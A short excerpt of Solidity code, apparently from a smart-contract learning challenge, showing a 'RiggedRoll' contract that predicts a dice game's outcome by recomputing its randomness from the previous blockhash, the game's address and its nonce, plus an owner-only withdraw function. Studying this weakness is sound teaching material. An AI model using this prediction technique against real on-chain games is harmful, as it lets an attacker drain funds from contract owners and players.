...
contract RiggedRoll is Ownable {
    ...
    function withdraw(address _addr, uint256 _amount) onlyOwner public {
        require(address(this).balance >= _amount,"There is not that amount in the rigged contract");
    ...
    function riggedRoll() public {
        require(address(this).balance>= 0.002 ether, "Rigged Roll contract does not have enough funds");
        uint256 nonce= diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;
        console.log("DEBUGGING ROLL: ",roll);
